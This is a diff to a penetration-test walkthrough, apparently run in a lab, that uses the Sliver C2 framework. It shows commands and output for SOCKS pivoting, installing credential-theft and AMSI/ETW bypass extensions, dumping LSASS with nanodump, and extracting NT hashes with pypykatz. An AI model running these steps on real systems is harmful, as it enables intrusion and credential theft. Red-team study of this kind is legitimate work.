@@ -346,11 +346,23 @@ PoC - Step 6 - Get the reverse shell and then configure the SLIVER handler (C2 s
 S-1-5-21-936125016-2310263949-2175806047-500
 
 
+[server] sliver (BOILING_LIVER) > whoami
+
+Logon ID: Laptop1\Administrator
+[*] Current Token ID: Laptop1\Administrator
+
+
 [server] sliver (BOILING_LIVER) > socks5 start
 
 [*] Started SOCKS5 127.0.0.1 1081  
 âš   In-band SOCKS proxies can be a little unstable depending on protocol
 
+              
+server] sliver (BOILING_LIVER) > background
+
+[*] Background ...
+
+[server] sliver > 
 
 ------------------------------------------------------------------
 Notes
@@ -370,13 +382,13 @@ jeff@kali:~$ tail /etc/proxychains.conf
 # socks4  127.0.0.1 9050
 # socks5  127.0.0.1 1080
 socks5  127.0.0.1 1081
-
+               
                
 ============================================================================================================================================
 PoC - Step 7 - Use Proxychains on the Kali Linux server (192.168.56.104) and the SLIVER session to pivot into the network '192.168.1.0/24'
 ============================================================================================================================================
 
-without using Proxychains and the SLIVER tunnel the network connection are filtered towards the Windows machines '192.168.1.113' and '192.168.1.167' from the Kali VM 
+without using Proxychains and the SLIVER tunnel, the network traffic is filtered towards the Windows machines '192.168.1.113' and '192.168.1.167' from the Kali VM 
 ---------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 jeff@kali:~/Documents/Tools/SLiver-C2$ nmap -Pn -sT -p 3389 192.168.1.113,167
@@ -567,9 +579,91 @@ Sliver:
 For even more information, please see our wiki: https://github.com/BishopFox/sliver/wiki
 
 
-server] sliver (BOILING_LIVER) > background
+[server] sliver (BOILING_LIVER) > background
 
 [*] Background ...
+
+
+[server] sliver > help armory
+
+Automatically download and install extensions/aliases
+
+Usage:
+======
+  armory [flags]
+
+Flags:
+======
+  -h, --help                   display help
+  -c, --ignore-cache           ignore metadata cache, force refresh
+  -I, --insecure               skip tls certificate validation
+  -p, --proxy        string    specify a proxy url (e.g. http://localhost:8080)
+  -t, --timeout      string    download timeout (default: 15m)
+
+Sub Commands:
+=============
+  install  Install an alias or extension
+  search   Search for aliases and extensions by name (regex)
+  update   Update installed an aliases and extensions
+
+[server] sliver > armory install all
+
+? Install 18 aliases and 83 extensions? No
+
+[server] sliver > 
+
+[server] sliver > armory install windows-credentials
+
+[*] Installing extension 'nanodump' (v0.0.5) ... done!
+[*] Installing extension 'credman' (v1.0.7) ... done!
+[*] Installing extension 'chromiumkeydump' (v0.0.2) ... done!
+[*] Installing extension 'handlekatz' (v0.0.1) ... done!
+
+[server] sliver > armory install windows-bypass
+
+[*] Installing extension 'inject-etw-bypass' (v0.0.3) ... done!
+[*] Installing extension 'inject-amsi-bypass' (v0.0.2) ... done!
+[*] Installing extension 'unhook-bof' (v0.0.2) ... done!
+
+[server] sliver > armory install c2-tool-collection
+
+[*] Installing extension 'c2tc-addmachineaccount' (v0.0.4) ... done!
+[*] Installing extension 'c2tc-askcreds' (v0.0.4) ... done!
+[*] Installing extension 'c2tc-kerberoast' (v0.0.4) ... done!
+[*] Installing extension 'c2tc-lapsdump' (v0.0.4) ... done!
+[*] Installing extension 'c2tc-petitpotam' (v0.0.4) ... done!
+[*] Installing extension 'c2tc-psw' (v0.0.4) ... done!
+[*] Installing extension 'c2tc-smbinfo' (v0.0.4) ... done!
+[*] Installing extension 'c2tc-winver' (v0.0.4) ... done!
+
+[server] sliver > armory install .net-pivot
+
+[*] Installing alias 'KrbRelayUp' (v0.0.1) ... done!
+[*] Installing alias 'Rubeus' (v0.0.21) ... done!
+[*] Installing alias 'Certify' (v0.0.2) ... done!
+[*] Installing alias 'SharpSecDump' (v0.0.1) ... done!
+[*] Installing alias 'SharpChrome' (v0.0.1) ... done!
+[*] Installing alias 'SharpDPAPI' (v0.0.1) ... done!
+[*] Installing alias 'sqlrecon' (v0.0.1) ... done!
+[*] Installing alias 'SharpLAPS' (v0.0.1) ... done!
+
+[server] sliver > armory install .net-execute
+
+[*] Installing alias 'Sharp SMBExec' (v0.0.3) ... done!
+[*] Installing alias 'Sharp WMI' (v0.0.2) ... done!
+[*] Installing alias 'SharpMapExec' (v0.0.1) ... done!
+[*] Installing alias 'SharPersist' (v0.0.1) ... done!
+[*] Installing alias 'SharpRDP' (v0.0.1) ... done!
+
+[server] sliver > armory install .net-recon
+
+[*] Installing alias 'Seatbelt' (v0.0.3) ... done!
+[*] Installing alias 'Sharp Hound 3' (v0.0.2) ... done!
+[*] Installing alias 'SharpUp' (v0.0.1) ... done!
+[*] Installing alias 'SharpView' (v0.0.1) ... done!
+[!] Failed to install alias 'sharpview': 'sharpview' command already exists
+[server] sliver >  
+
 
 [server] sliver > sessions
 
@@ -583,26 +677,110 @@ server] sliver (BOILING_LIVER) > background
 [*] Active session BOILING_LIVER (12d24a56)
 
 
-[server] sliver (BOILING_LIVER) > whoami
+[server] sliver (BOILING_LIVER) > ps
 
-Logon ID: Laptop1\Administrator
-[*] Current Token ID: Laptop1\Administrator
+ Pid     Ppid    Owner                          Arch     Executable                                     Session 
+======= ======= ============================== ======== ============================================== =========
+ 0       0                                               [System Process]                               -1      
+ 4       0                                      x86_64   System                                         0       
+ 72      4                                      x86_64   Secure System                                  0       
+ 132     4                                      x86_64   Registry                                       0       
+ 532     4                                      x86_64   smss.exe                                       0       
+ 700     624                                    x86_64   csrss.exe                                      0       
+ 788     624                                    x86_64   wininit.exe                                    0       
+ 928     788                                    x86_64   services.exe                                   0       
+ 948     788     NT AUTHORITY\SYSTEM            x86_64   LsaIso.exe                                     0       
+ 956     788     NT AUTHORITY\SYSTEM            x86_64   lsass.exe                                      0
+ <SNIP>       
+? [1/6] Continue? No
 
 
-[server] sliver (BOILING_LIVER) > getprivs
+[server] sliver (BOILING_LIVER) > help nanodump
 
-Privilege Information for Packed-SliverRevShell.exe (PID: 6232)
-----------------------------------------------------------------
+A Beacon Object File that creates a minidump of the LSASS process.
 
-Process Integrity Level: High
+Usage:
+======
+  nanodump [flags] pid dump-name write-file signature
 
-Name                                            Description                                                             Attributes
-====                                            ===========                                                             ==========
-SeLockMemoryPrivilege                           Lock pages in memory                                                    Disabled
-SeIncreaseQuotaPrivilege                        Adjust memory quotas for a process                                      Disabled
-SeSecurityPrivilege                             Manage auditing and security log                                        Disabled
-SeTakeOwnershipPrivilege                        Take ownership of files or other objects                                Disabled
-SeLoadDriverPrivilege                           Load and unload device drivers                                          Disabled
-SeSystemProfilePrivilege                        Profile system performance                                              Disabled
+Args:
+=====
+  pid         int       The PID of the process you want to dump.
+  dump-name   string    The name of the dump file.
+  write-file  int       1 = write file, 0 = fileless
+  signature   string    Signature used for evasion, PMDM = default
+
+Flags:
+======
+  -h, --help           display help
+  -t, --timeout int    command timeout in seconds (default: 60)
+
+
+[server] sliver (BOILING_LIVER) > nanodump 956 memorydump 1 PMDM
+
+[*] Successfully executed nanodump (coff-loader)
+[*] Got output:
+Done, to download the dump run:
+download memorydump
+to get the secretz run:
+python3 -m pypykatz lsa minidump memorydump
+
+
+[server] sliver (BOILING_LIVER) > ls
+
+C:\Users\Administrator.PO718687\Downloads (7 items, 445.7 MiB)
+==============================================================
+-rw-rw-rw-  desktop.ini                      282 B      Tue Apr 20 19:02:20 +0100 2021
+-rw-rw-rw-  memorydump                       14.4 MiB   Wed Jan 04 18:11:06 +0100 2023
+-rw-rw-rw-  Packed-SliverRevShell.exe        18.0 MiB   Wed Jan 04 14:35:35 +0100 2023
+
+
+[server] sliver (BOILING_LIVER) > download memorydump
+
+[*] Wrote 15090602 bytes (1 file successfully, 0 files unsuccessfully) to /home/jeff/memorydump
+
+[server] sliver (BOILING_LIVER) >  
+
+
+------------------
+
+jeff@kali:~$ python3 -m pypykatz lsa minidump /home/jeff/memorydump
+INFO:pypykatz:Parsing file memorydump
+FILE: ======== memorydump =======
+== LogonSession ==
+authentication_id 678126503 (286b63a7)
+session_id 10
+username Administrator
+domainname Laptop1
+logon_server Laptop1
+logon_time 2023-01-04T10:06:39.133286+00:00
+sid S-1-5-21-936125016-2310263949-2175806047-500
+luid 678126503
+        == MSV ==
+                Username: Administrator
+                Domain: Laptop1
+                LM: NA
+                NT: 36f7a3ebaa54935ecf0367<SNIP>
+                SHA1: d5feabcececab0e16c2c<SNIP>
+                DPAPI: NA
+        == WDIGEST [286b63a7]==
+                username Administrator
+                domainname Laptop1
+                password None
+                password (hex)
+        == Kerberos ==
+                Username: Administrator
+                Domain: Laptop1
+        == WDIGEST [286b63a7]==
+                username Administrator
+                domainname Laptop1
+                password None
+                password (hex)
+        == TSPKG [286b63a7]==
+                username Administrator
+                domainname Laptop1
+                password <SNIP>
+                password (hex)54006f0074006f007200<SNIP>
+        == DPAPI [286b63a7]==
+                luid 678126503
 <SNIP>
-
